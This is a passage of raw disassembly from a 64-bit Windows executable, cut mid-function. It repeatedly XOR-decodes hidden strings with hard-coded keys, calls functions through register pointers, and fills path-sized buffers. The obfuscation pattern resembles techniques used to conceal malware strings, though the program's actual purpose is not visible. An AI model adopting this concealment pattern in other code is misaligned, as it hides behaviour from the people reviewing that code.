   140001f3c:	66 0f 6f 05 dc 71 38 	movdqa 0x3871dc(%rip),%xmm0        # 0x140389120
   140001f43:	00 
   140001f44:	89 84 24 70 15 00 00 	mov    %eax,0x1570(%rsp)
   140001f4b:	0f 29 84 24 60 15 00 	movaps %xmm0,0x1560(%rsp)
   140001f52:	00 
   140001f53:	e8 48 49 00 00       	call   0x1400068a0
   140001f58:	80 38 00             	cmpb   $0x0,(%rax)
   140001f5b:	0f 84 aa 0e 00 00    	je     0x140002e0b
   140001f61:	48 8d 0d 38 b8 00 00 	lea    0xb838(%rip),%rcx        # 0x14000d7a0
   140001f68:	e8 33 49 00 00       	call   0x1400068a0
   140001f6d:	49 89 c7             	mov    %rax,%r15
   140001f70:	41 80 7f 36 00       	cmpb   $0x0,0x36(%r15)
   140001f75:	74 35                	je     0x140001fac
   140001f77:	49 b8 9b f9 55 b5 17 	movabs $0x7d410717b555f99b,%r8
   140001f7e:	07 41 7d 
   140001f81:	31 c0                	xor    %eax,%eax
   140001f83:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001f88:	48 89 c1             	mov    %rax,%rcx
   140001f8b:	4c 89 c2             	mov    %r8,%rdx
   140001f8e:	83 e1 07             	and    $0x7,%ecx
   140001f91:	48 c1 e1 03          	shl    $0x3,%rcx
   140001f95:	48 d3 ea             	shr    %cl,%rdx
   140001f98:	66 41 31 14 47       	xor    %dx,(%r15,%rax,2)
   140001f9d:	48 83 c0 01          	add    $0x1,%rax
   140001fa1:	48 83 f8 1b          	cmp    $0x1b,%rax
   140001fa5:	75 e1                	jne    0x140001f88
   140001fa7:	41 c6 47 36 00       	movb   $0x0,0x36(%r15)
   140001fac:	48 8b 05 9d 71 38 00 	mov    0x38719d(%rip),%rax        # 0x140389150
   140001fb3:	41 b8 17 07 00 00    	mov    $0x717,%r8d
   140001fb9:	66 0f 6f 05 7f 71 38 	movdqa 0x38717f(%rip),%xmm0        # 0x140389140
   140001fc0:	00 
   140001fc1:	48 8d 0d b8 b7 00 00 	lea    0xb7b8(%rip),%rcx        # 0x14000d780
   140001fc8:	66 44 89 84 24 58 15 	mov    %r8w,0x1558(%rsp)
   140001fcf:	00 00 
   140001fd1:	0f 29 84 24 40 15 00 	movaps %xmm0,0x1540(%rsp)
   140001fd8:	00 
   140001fd9:	48 89 84 24 50 15 00 	mov    %rax,0x1550(%rsp)
   140001fe0:	00 
   140001fe1:	e8 ba 48 00 00       	call   0x1400068a0
   140001fe6:	48 8d 0d 73 b7 00 00 	lea    0xb773(%rip),%rcx        # 0x14000d760
   140001fed:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140001ff2:	e8 a9 48 00 00       	call   0x1400068a0
   140001ff7:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
   140001ffc:	48 89 c2             	mov    %rax,%rdx
   140001fff:	41 80 38 00          	cmpb   $0x0,(%r8)
   140002003:	75 4d                	jne    0x140002052
   140002005:	c6 40 1a 01          	movb   $0x1,0x1a(%rax)
   140002009:	48 8b 84 24 40 15 00 	mov    0x1540(%rsp),%rax
   140002010:	00 
   140002011:	b9 17 07 00 00       	mov    $0x717,%ecx
   140002016:	66 89 4a 18          	mov    %cx,0x18(%rdx)
   14000201a:	48 8d 0d 6f 9c 00 00 	lea    0x9c6f(%rip),%rcx        # 0x14000bc90
   140002021:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
   140002026:	48 89 02             	mov    %rax,(%rdx)
   140002029:	48 8b 84 24 48 15 00 	mov    0x1548(%rsp),%rax
   140002030:	00 
   140002031:	48 89 42 08          	mov    %rax,0x8(%rdx)
   140002035:	48 8b 84 24 50 15 00 	mov    0x1550(%rsp),%rax
   14000203c:	00 
   14000203d:	48 89 42 10          	mov    %rax,0x10(%rdx)
   140002041:	41 c6 00 01          	movb   $0x1,(%r8)
   140002045:	45 31 c0             	xor    %r8d,%r8d
   140002048:	e8 93 3f 00 00       	call   0x140005fe0
   14000204d:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140002052:	80 7a 1a 00          	cmpb   $0x0,0x1a(%rdx)
   140002056:	74 29                	je     0x140002081
   140002058:	48 b8 9b f9 f9 55 55 	movabs $0x17b5b55555f9f99b,%rax
   14000205f:	b5 b5 17 
   140002062:	c6 42 1a 00          	movb   $0x0,0x1a(%rdx)
   140002066:	48 b9 17 07 07 41 41 	movabs $0x7d7d4141070717,%rcx
   14000206d:	7d 7d 00 
   140002070:	48 31 02             	xor    %rax,(%rdx)
   140002073:	48 31 4a 08          	xor    %rcx,0x8(%rdx)
   140002077:	48 31 42 10          	xor    %rax,0x10(%rdx)
   14000207b:	66 81 72 18 17 07    	xorw   $0x717,0x18(%rdx)
   140002081:	48 89 d1             	mov    %rdx,%rcx
   140002084:	41 ff d6             	call   *%r14
   140002087:	4d 89 f8             	mov    %r15,%r8
   14000208a:	4c 89 e1             	mov    %r12,%rcx
   14000208d:	48 89 c2             	mov    %rax,%rdx
   140002090:	e8 4b 21 00 00       	call   0x1400041e0
   140002095:	41 b8 dc 06 00 00    	mov    $0x6dc,%r8d
   14000209b:	48 89 f1             	mov    %rsi,%rcx
   14000209e:	48 8d 15 db a4 00 00 	lea    0xa4db(%rip),%rdx        # 0x14000c580
   1400020a5:	e8 1e 9a 00 00       	call   0x14000bac8
   1400020aa:	48 8d 0d 4f b7 00 00 	lea    0xb74f(%rip),%rcx        # 0x14000d800
   1400020b1:	e8 ea 47 00 00       	call   0x1400068a0
   1400020b6:	48 8d 0d 23 b7 00 00 	lea    0xb723(%rip),%rcx        # 0x14000d7e0
   1400020bd:	49 89 c7             	mov    %rax,%r15
   1400020c0:	e8 db 47 00 00       	call   0x1400068a0
   1400020c5:	41 80 3f 00          	cmpb   $0x0,(%r15)
   1400020c9:	49 89 c1             	mov    %rax,%r9
   1400020cc:	75 38                	jne    0x140002106
   1400020ce:	41 b8 dc 06 00 00    	mov    $0x6dc,%r8d
   1400020d4:	48 89 f2             	mov    %rsi,%rdx
   1400020d7:	48 89 c1             	mov    %rax,%rcx
   1400020da:	c6 80 dc 06 00 00 01 	movb   $0x1,0x6dc(%rax)
   1400020e1:	e8 e2 99 00 00       	call   0x14000bac8
   1400020e6:	41 c6 07 01          	movb   $0x1,(%r15)
   1400020ea:	45 31 c0             	xor    %r8d,%r8d
   1400020ed:	48 8d 0d 2c 9d 00 00 	lea    0x9d2c(%rip),%rcx        # 0x14000be20
   1400020f4:	48 89 c2             	mov    %rax,%rdx
   1400020f7:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400020fc:	e8 df 3e 00 00       	call   0x140005fe0
   140002101:	4c 8b 4c 24 48       	mov    0x48(%rsp),%r9
   140002106:	41 80 b9 dc 06 00 00 	cmpb   $0x0,0x6dc(%r9)
   14000210d:	00 
   14000210e:	74 39                	je     0x140002149
   140002110:	49 b8 f1 d7 45 25 57 	movabs $0x73c5e5572545d7f1,%r8
   140002117:	e5 c5 73 
   14000211a:	31 c0                	xor    %eax,%eax
   14000211c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002120:	48 89 c1             	mov    %rax,%rcx
   140002123:	4c 89 c2             	mov    %r8,%rdx
   140002126:	83 e1 07             	and    $0x7,%ecx
   140002129:	48 c1 e1 03          	shl    $0x3,%rcx
   14000212d:	48 d3 ea             	shr    %cl,%rdx
   140002130:	66 41 31 14 41       	xor    %dx,(%r9,%rax,2)
   140002135:	48 83 c0 01          	add    $0x1,%rax
   140002139:	48 3d 6e 03 00 00    	cmp    $0x36e,%rax
   14000213f:	75 df                	jne    0x140002120
   140002141:	41 c6 81 dc 06 00 00 	movb   $0x0,0x6dc(%r9)
   140002148:	00 
   140002149:	49 89 e8             	mov    %rbp,%r8
   14000214c:	48 89 da             	mov    %rbx,%rdx
   14000214f:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002154:	4c 89 64 24 38       	mov    %r12,0x38(%rsp)
   140002159:	4c 89 64 24 30       	mov    %r12,0x30(%rsp)
   14000215e:	4c 8d bc 24 f0 0a 00 	lea    0xaf0(%rsp),%r15
   140002165:	00 
   140002166:	4c 89 64 24 28       	mov    %r12,0x28(%rsp)
   14000216b:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140002170:	e8 cb 19 00 00       	call   0x140003b40
   140002175:	31 d2                	xor    %edx,%edx
   140002177:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   14000217d:	4c 89 f9             	mov    %r15,%rcx
   140002180:	e8 4b 99 00 00       	call   0x14000bad0
   140002185:	48 8b 05 e4 6f 38 00 	mov    0x386fe4(%rip),%rax        # 0x140389170
   14000218c:	48 8d 0d ad b6 00 00 	lea    0xb6ad(%rip),%rcx        # 0x14000d840
   140002193:	66 0f 6f 05 c5 6f 38 	movdqa 0x386fc5(%rip),%xmm0        # 0x140389160
   14000219a:	00 
   14000219b:	0f 29 84 24 40 15 00 	movaps %xmm0,0x1540(%rsp)
   1400021a2:	00 
   1400021a3:	48 89 84 24 50 15 00 	mov    %rax,0x1550(%rsp)
   1400021aa:	00 
   1400021ab:	b8 cb 01 00 00       	mov    $0x1cb,%eax
   1400021b0:	66 89 84 24 58 15 00 	mov    %ax,0x1558(%rsp)
   1400021b7:	00 
   1400021b8:	e8 e3 46 00 00       	call   0x1400068a0
   1400021bd:	80 38 00             	cmpb   $0x0,(%rax)
   1400021c0:	0f 84 da 0b 00 00    	je     0x140002da0
   1400021c6:	48 8d 0d 53 b6 00 00 	lea    0xb653(%rip),%rcx        # 0x14000d820
   1400021cd:	e8 ce 46 00 00       	call   0x1400068a0
   1400021d2:	48 89 c2             	mov    %rax,%rdx
   1400021d5:	80 7a 1a 00          	cmpb   $0x0,0x1a(%rdx)
   1400021d9:	74 29                	je     0x140002204
   1400021db:	48 b8 77 3f 3f b5 b5 	movabs $0xcb3d3db5b53f3f77,%rax
   1400021e2:	3d 3d cb 
   1400021e5:	c6 42 1a 00          	movb   $0x0,0x1a(%rdx)
   1400021e9:	48 b9 cb 01 01 b9 b9 	movabs $0x101b9b90101cb,%rcx
   1400021f0:	01 01 00 
   1400021f3:	48 31 02             	xor    %rax,(%rdx)
   1400021f6:	48 31 4a 08          	xor    %rcx,0x8(%rdx)
   1400021fa:	48 31 42 10          	xor    %rax,0x10(%rdx)
   1400021fe:	66 81 72 18 cb 01    	xorw   $0x1cb,0x18(%rdx)
   140002204:	49 89 d0             	mov    %rdx,%r8
   140002207:	4c 89 f9             	mov    %r15,%rcx
   14000220a:	48 89 da             	mov    %rbx,%rdx
   14000220d:	e8 ce 1f 00 00       	call   0x1400041e0
   140002212:	4c 89 e2             	mov    %r12,%rdx
   140002215:	4c 89 e9             	mov    %r13,%rcx
   140002218:	e8 4b 98 00 00       	call   0x14000ba68
   14000221d:	85 c0                	test   %eax,%eax
   14000221f:	0f 85 2c 0f 00 00    	jne    0x140003151
   140002225:	48 8d ac 24 00 0d 00 	lea    0xd00(%rsp),%rbp
   14000222c:	00 
   14000222d:	31 d2                	xor    %edx,%edx
   14000222f:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140002235:	48 89 e9             	mov    %rbp,%rcx
   140002238:	e8 93 98 00 00       	call   0x14000bad0
   14000223d:	8b 05 4d 6f 38 00    	mov    0x386f4d(%rip),%eax        # 0x140389190
   140002243:	48 8d 0d 76 b6 00 00 	lea    0xb676(%rip),%rcx        # 0x14000d8c0
   14000224a:	66 0f 6f 05 2e 6f 38 	movdqa 0x386f2e(%rip),%xmm0        # 0x140389180
   140002251:	00 
   140002252:	0f 29 84 24 40 15 00 	movaps %xmm0,0x1540(%rsp)
   140002259:	00 
   14000225a:	89 84 24 50 15 00 00 	mov    %eax,0x1550(%rsp)
   140002261:	e8 3a 46 00 00       	call   0x1400068a0
   140002266:	48 8d 0d 33 b6 00 00 	lea    0xb633(%rip),%rcx        # 0x14000d8a0
   14000226d:	49 89 c5             	mov    %rax,%r13
   140002270:	e8 2b 46 00 00       	call   0x1400068a0
   140002275:	41 80 7d 00 00       	cmpb   $0x0,0x0(%r13)
   14000227a:	49 89 c4             	mov    %rax,%r12
   14000227d:	75 40                	jne    0x1400022bf
   14000227f:	c6 40 14 01          	movb   $0x1,0x14(%rax)
   140002283:	45 31 c0             	xor    %r8d,%r8d
   140002286:	48 8b 84 24 40 15 00 	mov    0x1540(%rsp),%rax
   14000228d:	00 
   14000228e:	4c 89 e2             	mov    %r12,%rdx
   140002291:	48 8d 0d 88 99 00 00 	lea    0x9988(%rip),%rcx        # 0x14000bc20
   140002298:	49 89 04 24          	mov    %rax,(%r12)
   14000229c:	48 8b 84 24 48 15 00 	mov    0x1548(%rsp),%rax
   1400022a3:	00 
   1400022a4:	49 89 44 24 08       	mov    %rax,0x8(%r12)
   1400022a9:	8b 84 24 50 15 00 00 	mov    0x1550(%rsp),%eax
   1400022b0:	41 89 44 24 10       	mov    %eax,0x10(%r12)
   1400022b5:	41 c6 45 00 01       	movb   $0x1,0x0(%r13)
   1400022ba:	e8 21 3d 00 00       	call   0x140005fe0
   1400022bf:	41 80 7c 24 14 00    	cmpb   $0x0,0x14(%r12)
   1400022c5:	74 2c                	je     0x1400022f3
   1400022c7:	48 b8 cd 4b 4b c3 c3 	movabs $0xb90707c3c34b4bcd,%rax
   1400022ce:	07 07 b9 
   1400022d1:	41 c6 44 24 14 00    	movb   $0x0,0x14(%r12)
   1400022d7:	49 31 04 24          	xor    %rax,(%r12)
   1400022db:	48 b8 b9 71 71 b3 b3 	movabs $0x1b1bb3b37171b9,%rax
   1400022e2:	1b 1b 00 
   1400022e5:	41 81 74 24 10 cd 4b 	xorl   $0xc34b4bcd,0x10(%r12)
   1400022ec:	4b c3 
   1400022ee:	49 31 44 24 08       	xor    %rax,0x8(%r12)
   1400022f3:	4d 89 e0             	mov    %r12,%r8
   1400022f6:	4c 89 fa             	mov    %r15,%rdx
   1400022f9:	4c 8d 25 20 b9 00 00 	lea    0xb920(%rip),%r12        # 0x14000dc20
   140002300:	48 89 e9             	mov    %rbp,%rcx
   140002303:	e8 d8 1e 00 00       	call   0x1400041e0
   140002308:	8b 15 12 a9 01 00    	mov    0x1a912(%rip),%edx        # 0x14001cc20
   14000230e:	4c 89 e1             	mov    %r12,%rcx
   140002311:	e8 2a f5 ff ff       	call   0x140001840
   140002316:	66 0f 6f 05 82 6e 38 	movdqa 0x386e82(%rip),%xmm0        # 0x1403891a0
   14000231d:	00 
   14000231e:	48 8d 0d db b5 00 00 	lea    0xb5db(%rip),%rcx        # 0x14000d900
   140002325:	8b 05 a5 6e 38 00    	mov    0x386ea5(%rip),%eax        # 0x1403891d0
   14000232b:	0f 29 84 24 40 15 00 	movaps %xmm0,0x1540(%rsp)
   140002332:	00 
   140002333:	66 0f 6f 05 75 6e 38 	movdqa 0x386e75(%rip),%xmm0        # 0x1403891b0
   14000233a:	00 
   14000233b:	4c 63 2d de a8 01 00 	movslq 0x1a8de(%rip),%r13        # 0x14001cc20
   140002342:	0f 29 84 24 50 15 00 	movaps %xmm0,0x1550(%rsp)
   140002349:	00 
   14000234a:	66 0f 6f 05 6e 6e 38 	movdqa 0x386e6e(%rip),%xmm0        # 0x1403891c0
   140002351:	00 
   140002352:	89 84 24 70 15 00 00 	mov    %eax,0x1570(%rsp)
   140002359:	b8 db ff ff ff       	mov    $0xffffffdb,%eax
   14000235e:	0f 29 84 24 60 15 00 	movaps %xmm0,0x1560(%rsp)
   140002365:	00 
   140002366:	66 89 84 24 74 15 00 	mov    %ax,0x1574(%rsp)
   14000236d:	00 
   14000236e:	e8 2d 45 00 00       	call   0x1400068a0
   140002373:	80 38 00             	cmpb   $0x0,(%rax)
   140002376:	0f 84 b4 0c 00 00    	je     0x140003030
   14000237c:	48 8d 0d 5d b5 00 00 	lea    0xb55d(%rip),%rcx        # 0x14000d8e0
   140002383:	e8 18 45 00 00       	call   0x1400068a0
   140002388:	49 89 c2             	mov    %rax,%r10
   14000238b:	41 80 7a 36 00       	cmpb   $0x0,0x36(%r10)
   140002390:	74 32                	je     0x1400023c4
   140002392:	49 b8 37 71 db ff 29 	movabs $0xd53df29ffdb7137,%r8
   140002399:	df 53 0d 
   14000239c:	31 c0                	xor    %eax,%eax
   14000239e:	66 90                	xchg   %ax,%ax
   1400023a0:	48 89 c1             	mov    %rax,%rcx
   1400023a3:	4c 89 c2             	mov    %r8,%rdx
   1400023a6:	83 e1 07             	and    $0x7,%ecx
   1400023a9:	48 c1 e1 03          	shl    $0x3,%rcx
   1400023ad:	48 d3 ea             	shr    %cl,%rdx
   1400023b0:	66 41 31 14 42       	xor    %dx,(%r10,%rax,2)
   1400023b5:	48 83 c0 01          	add    $0x1,%rax
   1400023b9:	48 83 f8 1b          	cmp    $0x1b,%rax
   1400023bd:	75 e1                	jne    0x1400023a0
   1400023bf:	41 c6 42 36 00       	movb   $0x0,0x36(%r10)
   1400023c4:	4c 89 d1             	mov    %r10,%rcx
   1400023c7:	4d 89 f9             	mov    %r15,%r9
   1400023ca:	4d 89 e8             	mov    %r13,%r8
   1400023cd:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1400023d2:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   1400023d7:	4c 89 e2             	mov    %r12,%rdx
   1400023da:	c7 44 24 30 01 00 00 	movl   $0x1,0x30(%rsp)
   1400023e1:	00 
   1400023e2:	4c 8d ac 24 10 0f 00 	lea    0xf10(%rsp),%r13
   1400023e9:	00 
   1400023ea:	e8 41 f2 ff ff       	call   0x140001630
   1400023ef:	31 d2                	xor    %edx,%edx
   1400023f1:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   1400023f7:	4c 89 e9             	mov    %r13,%rcx
   1400023fa:	e8 d1 96 00 00       	call   0x14000bad0
   1400023ff:	48 8b 05 ea 6d 38 00 	mov    0x386dea(%rip),%rax        # 0x1403891f0
   140002406:	48 8d 0d 73 b5 00 00 	lea    0xb573(%rip),%rcx        # 0x14000d980
   14000240d:	66 0f 6f 05 cb 6d 38 	movdqa 0x386dcb(%rip),%xmm0        # 0x1403891e0
   140002414:	00 
   140002415:	0f 29 84 24 40 15 00 	movaps %xmm0,0x1540(%rsp)
   14000241c:	00 
   14000241d:	48 89 84 24 50 15 00 	mov    %rax,0x1550(%rsp)
   140002424:	00 
   140002425:	8b 05 cd 6d 38 00    	mov    0x386dcd(%rip),%eax        # 0x1403891f8
   14000242b:	89 84 24 58 15 00 00 	mov    %eax,0x1558(%rsp)
   140002432:	e8 69 44 00 00       	call   0x1400068a0
   140002437:	48 8d 0d 22 b5 00 00 	lea    0xb522(%rip),%rcx        # 0x14000d960
   14000243e:	80 38 00             	cmpb   $0x0,(%rax)
   140002441:	48 89 c5             	mov    %rax,%rbp
   140002444:	0f 84 f9 0d 00 00    	je     0x140003243
   14000244a:	e8 51 44 00 00       	call   0x1400068a0
   14000244f:	49 89 c4             	mov    %rax,%r12
   140002452:	41 80 7c 24 1c 00    	cmpb   $0x0,0x1c(%r12)
   140002458:	74 31                	je     0x14000248b
   14000245a:	48 b8 8d 7b 7b 59 59 	movabs $0x59dfdf59597b7b8d,%rax
   140002461:	df df 59 
   140002464:	41 c6 44 24 1c 00    	movb   $0x0,0x1c(%r12)
   14000246a:	48 ba 59 ff ff 55 55 	movabs $0xbbbb5555ffff59,%rdx
   140002471:	bb bb 00 
   140002474:	49 31 04 24          	xor    %rax,(%r12)
   140002478:	49 31 54 24 08       	xor    %rdx,0x8(%r12)
   14000247d:	49 31 44 24 10       	xor    %rax,0x10(%r12)
   140002482:	41 81 74 24 18 59 ff 	xorl   $0x55ffff59,0x18(%r12)
   140002489:	ff 55 
   14000248b:	48 8b 05 7e 6d 38 00 	mov    0x386d7e(%rip),%rax        # 0x140389210
   140002492:	66 0f 6f 05 66 6d 38 	movdqa 0x386d66(%rip),%xmm0        # 0x140389200
   140002499:	00 
   14000249a:	48 8d 0d 9f b4 00 00 	lea    0xb49f(%rip),%rcx        # 0x14000d940
   1400024a1:	0f 29 84 24 40 15 00 	movaps %xmm0,0x1540(%rsp)
   1400024a8:	00 
   1400024a9:	48 89 84 24 50 15 00 	mov    %rax,0x1550(%rsp)
   1400024b0:	00 
   1400024b1:	b8 59 ff ff ff       	mov    $0xffffff59,%eax
   1400024b6:	66 89 84 24 58 15 00 	mov    %ax,0x1558(%rsp)
   1400024bd:	00 
   1400024be:	e8 dd 43 00 00       	call   0x1400068a0
   1400024c3:	48 8d 0d 56 b4 00 00 	lea    0xb456(%rip),%rcx        # 0x14000d920
   1400024ca:	49 89 c7             	mov    %rax,%r15
   1400024cd:	e8 ce 43 00 00       	call   0x1400068a0
   1400024d2:	41 80 3f 00          	cmpb   $0x0,(%r15)
   1400024d6:	48 89 c5             	mov    %rax,%rbp
   1400024d9:	75 47                	jne    0x140002522
   1400024db:	c6 40 1a 01          	movb   $0x1,0x1a(%rax)
   1400024df:	45 31 c0             	xor    %r8d,%r8d
   1400024e2:	48 8b 84 24 40 15 00 	mov    0x1540(%rsp),%rax
   1400024e9:	00 
   1400024ea:	48 89 ea             	mov    %rbp,%rdx
   1400024ed:	48 8d 0d 6c 97 00 00 	lea    0x976c(%rip),%rcx        # 0x14000bc60
   1400024f4:	48 89 45 00          	mov    %rax,0x0(%rbp)
   1400024f8:	48 8b 84 24 48 15 00 	mov    0x1548(%rsp),%rax
   1400024ff:	00 
   140002500:	48 89 45 08          	mov    %rax,0x8(%rbp)
   140002504:	48 8b 84 24 50 15 00 	mov    0x1550(%rsp),%rax
   14000250b:	00 
   14000250c:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140002510:	b8 59 ff ff ff       	mov    $0xffffff59,%eax
   140002515:	66 89 45 18          	mov    %ax,0x18(%rbp)
   140002519:	41 c6 07 01          	movb   $0x1,(%r15)
   14000251d:	e8 be 3a 00 00       	call   0x140005fe0
   140002522:	80 7d 1a 00          	cmpb   $0x0,0x1a(%rbp)
   140002526:	74 2a                	je     0x140002552
   140002528:	48 b8 8d 7b 7b 59 59 	movabs $0x59dfdf59597b7b8d,%rax
   14000252f:	df df 59 
   140002532:	c6 45 1a 00          	movb   $0x0,0x1a(%rbp)
   140002536:	48 ba 59 ff ff 55 55 	movabs $0xbbbb5555ffff59,%rdx
   14000253d:	bb bb 00 
   140002540:	48 31 45 00          	xor    %rax,0x0(%rbp)
   140002544:	48 31 55 08          	xor    %rdx,0x8(%rbp)
   140002548:	48 31 45 10          	xor    %rax,0x10(%rbp)
   14000254c:	66 81 75 18 59 ff    	xorw   $0xff59,0x18(%rbp)
   140002552:	48 89 e9             	mov    %rbp,%rcx
   140002555:	bd 51 83 ff ff       	mov    $0xffff8351,%ebp
   14000255a:	41 ff d6             	call   *%r14
   14000255d:	4d 89 e0             	mov    %r12,%r8
   140002560:	4c 89 e9             	mov    %r13,%rcx
   140002563:	4c 8d b4 24 20 11 00 	lea    0x1120(%rsp),%r14
   14000256a:	00 
   14000256b:	48 89 c2             	mov    %rax,%rdx
   14000256e:	e8 6d 1c 00 00       	call   0x1400041e0
   140002573:	31 d2                	xor    %edx,%edx
   140002575:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   14000257b:	4c 89 f1             	mov    %r14,%rcx
   14000257e:	e8 4d 95 00 00       	call   0x14000bad0
   140002583:	66 0f 6f 05 95 6c 38 	movdqa 0x386c95(%rip),%xmm0        # 0x140389220
   14000258a:	00 
   14000258b:	48 8d 0d 2e b4 00 00 	lea    0xb42e(%rip),%rcx        # 0x14000d9c0
   140002592:	66 89 ac 24 50 15 00 	mov    %bp,0x1550(%rsp)
   140002599:	00 
   14000259a:	0f 29 84 24 40 15 00 	movaps %xmm0,0x1540(%rsp)
   1400025a1:	00 
   1400025a2:	e8 f9 42 00 00       	call   0x1400068a0
   1400025a7:	48 8d 0d f2 b3 00 00 	lea    0xb3f2(%rip),%rcx        # 0x14000d9a0
   1400025ae:	49 89 c4             	mov    %rax,%r12
   1400025b1:	e8 ea 42 00 00       	call   0x1400068a0
   1400025b6:	41 80 3c 24 00       	cmpb   $0x0,(%r12)
   1400025bb:	48 89 c5             	mov    %rax,%rbp
   1400025be:	75 3e                	jne    0x1400025fe
   1400025c0:	c6 40 12 01          	movb   $0x1,0x12(%rax)
   1400025c4:	41 bb 51 83 ff ff    	mov    $0xffff8351,%r11d
   1400025ca:	45 31 c0             	xor    %r8d,%r8d
   1400025cd:	48 89 ea             	mov    %rbp,%rdx
   1400025d0:	48 8b 84 24 40 15 00 	mov    0x1540(%rsp),%rax
   1400025d7:	00 
   1400025d8:	66 44 89 5d 10       	mov    %r11w,0x10(%rbp)
   1400025dd:	48 8d 0d 5c 98 00 00 	lea    0x985c(%rip),%rcx        # 0x14000be40
   1400025e4:	48 89 45 00          	mov    %rax,0x0(%rbp)
   1400025e8:	48 8b 84 24 48 15 00 	mov    0x1548(%rsp),%rax
   1400025ef:	00 
   1400025f0:	48 89 45 08          	mov    %rax,0x8(%rbp)
   1400025f4:	41 c6 04 24 01       	movb   $0x1,(%r12)
   1400025f9:	e8 e2 39 00 00       	call   0x140005fe0
   1400025fe:	80 7d 12 00          	cmpb   $0x0,0x12(%rbp)
   140002602:	74 26                	je     0x14000262a
   140002604:	48 b8 51 83 83 4d 4d 	movabs $0x2945454d4d838351,%rax
   14000260b:	45 45 29 
   14000260e:	c6 45 12 00          	movb   $0x0,0x12(%rbp)
   140002612:	48 31 45 00          	xor    %rax,0x0(%rbp)
   140002616:	48 b8 29 81 81 eb eb 	movabs $0x5f5febeb818129,%rax
   14000261d:	5f 5f 00 
   140002620:	66 81 75 10 51 83    	xorw   $0x8351,0x10(%rbp)
   140002626:	48 31 45 08          	xor    %rax,0x8(%rbp)
   14000262a:	49 89 e8             	mov    %rbp,%r8
   14000262d:	4c 89 ea             	mov    %r13,%rdx
   140002630:	48 8d 2d 09 a6 01 00 	lea    0x1a609(%rip),%rbp        # 0x14001cc40
   140002637:	4c 89 f1             	mov    %r14,%rcx
   14000263a:	e8 a1 1b 00 00       	call   0x1400041e0
   14000263f:	8b 15 cb de 01 00    	mov    0x1decb(%rip),%edx        # 0x140020510
   140002645:	48 89 e9             	mov    %rbp,%rcx
   140002648:	e8 f3 f1 ff ff       	call   0x140001840
   14000264d:	44 8b 05 bc de 01 00 	mov    0x1debc(%rip),%r8d        # 0x140020510
   140002654:	48 89 ea             	mov    %rbp,%rdx
   140002657:	4c 89 f1             	mov    %r14,%rcx
   14000265a:	e8 e1 21 00 00       	call   0x140004840
   14000265f:	4d 89 e8             	mov    %r13,%r8
   140002662:	48 89 fa             	mov    %rdi,%rdx
   140002665:	48 89 d9             	mov    %rbx,%rcx
   140002668:	e8 93 15 00 00       	call   0x140003c00
   14000266d:	48 8d 0d 8c b3 00 00 	lea    0xb38c(%rip),%rcx        # 0x14000da00
   140002674:	89 c5                	mov    %eax,%ebp
   140002676:	e8 25 42 00 00       	call   0x1400068a0
   14000267b:	48 8d 0d 5e b3 00 00 	lea    0xb35e(%rip),%rcx        # 0x14000d9e0
   140002682:	80 38 00             	cmpb   $0x0,(%rax)
   140002685:	49 89 c4             	mov    %rax,%r12
   140002688:	0f 84 80 0b 00 00    	je     0x14000320e
   14000268e:	e8 0d 42 00 00       	call   0x1400068a0
   140002693:	48 89 c7             	mov    %rax,%rdi
   140002696:	80 7f 08 00          	cmpb   $0x0,0x8(%rdi)
   14000269a:	74 18                	je     0x1400026b4
   14000269c:	f3 0f 7e 07          	movq   (%rdi),%xmm0
   1400026a0:	c6 47 08 00          	movb   $0x0,0x8(%rdi)
   1400026a4:	f3 0f 7e 0d 84 6b 38 	movq   0x386b84(%rip),%xmm1        # 0x140389230
   1400026ab:	00 
   1400026ac:	66 0f ef c1          	pxor   %xmm1,%xmm0
   1400026b0:	66 0f d6 07          	movq   %xmm0,(%rdi)
   1400026b4:	8b 05 c6 6b 38 00    	mov    0x386bc6(%rip),%eax        # 0x140389280
   1400026ba:	41 ba 1d c5 ff ff    	mov    $0xffffc51d,%r10d
   1400026c0:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   1400026c5:	66 0f 6f 05 93 6b 38 	movdqa 0x386b93(%rip),%xmm0        # 0x140389260
   1400026cc:	00 
   1400026cd:	48 8d 0d 6c b3 00 00 	lea    0xb36c(%rip),%rcx        # 0x14000da40
   1400026d4:	66 44 89 94 24 84 15 	mov    %r10w,0x1584(%rsp)
   1400026db:	00 00 
   1400026dd:	66 44 0f 6f 05 5a 6b 	movdqa 0x386b5a(%rip),%xmm8        # 0x140389240
   1400026e4:	38 00 
   1400026e6:	0f 29 84 24 60 15 00 	movaps %xmm0,0x1560(%rsp)
   1400026ed:	00 
   1400026ee:	66 0f 6f 3d 5a 6b 38 	movdqa 0x386b5a(%rip),%xmm7        # 0x140389250
   1400026f5:	00 
   1400026f6:	66 0f 6f 05 72 6b 38 	movdqa 0x386b72(%rip),%xmm0        # 0x140389270
   1400026fd:	00 
   1400026fe:	89 84 24 80 15 00 00 	mov    %eax,0x1580(%rsp)
   140002705:	44 0f 29 84 24 40 15 	movaps %xmm8,0x1540(%rsp)
   14000270c:	00 00 
   14000270e:	0f 29 84 24 70 15 00 	movaps %xmm0,0x1570(%rsp)
   140002715:	00 
   140002716:	0f 29 bc 24 50 15 00 	movaps %xmm7,0x1550(%rsp)
   14000271d:	00 
   14000271e:	e8 7d 41 00 00       	call   0x1400068a0
   140002723:	48 8d 0d f6 b2 00 00 	lea    0xb2f6(%rip),%rcx        # 0x14000da20
   14000272a:	49 89 c4             	mov    %rax,%r12
   14000272d:	e8 6e 41 00 00       	call   0x1400068a0
   140002732:	41 80 3c 24 00       	cmpb   $0x0,(%r12)
   140002737:	48 89 c7             	mov    %rax,%rdi
   14000273a:	0f 85 86 00 00 00    	jne    0x1400027c6
